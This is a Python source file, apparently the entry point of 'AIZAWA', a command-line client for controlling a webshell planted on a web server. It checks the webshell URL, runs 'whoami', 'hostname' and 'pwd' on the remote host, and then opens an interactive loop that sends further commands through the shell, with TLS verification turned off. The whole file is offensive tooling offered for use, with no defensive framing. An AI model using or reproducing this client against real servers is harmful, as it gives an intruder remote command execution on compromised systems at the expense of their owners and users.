#!/usr/bin/env python
######################################################
##                                                  ##
##                  A I Z A W A                     ##
##                                                  ##
## Simple command Line webshell by @elliottophellia ##
##                                                  ##
######################################################

import re
import sys
import httpx
import asyncio
from modules.http import GetHeaders
from modules.executor import Executor
from modules.validator import Validator
from modules.colors import RED, CLEAR, BOLD
from modules.utilities import Banner, PrintInfo, Ping

async def main():
    async with httpx.AsyncClient(verify=False, http2=True, timeout=None) as client:
        url = sys.argv[1] if len(sys.argv) > 1 else input("Webshell URL: ")
        url = Validator.validate_url(url)

        regex = re.compile(r"^.*\.[a-zA-Z]+", re.MULTILINE)
        remove_char = regex.findall(url)
        url = remove_char[0]

        await Ping(client, url)

        headers = await GetHeaders.get_headers(client, url)
        type = Validator.validate_headers(headers)

        type = Validator.validate_type(type)

        user = await Executor.execute(client, url, "whoami", type)
        host = await Executor.execute(client, url, "hostname", type)
        pwd = await Executor.execute(client, url, "pwd", type)

        user, host, pwd = Validator.process_user_host_pwd(user, host, pwd)

        await PrintInfo(type, client, url)

        await Executor.execute_commands(client, url, type, user, host, pwd)


if __name__ == "__main__":
    
    Banner()

    try:
        asyncio.run(main())
    except Exception as e:
        print(
            f"An error of type {type(e).__name__} occurred. Please check the server's SSL/TLS configuration and your network connection."
        )
    except KeyboardInterrupt:
        print(f"\n{BOLD}{RED}Ctrl + C detected. Exiting...{CLEAR}")
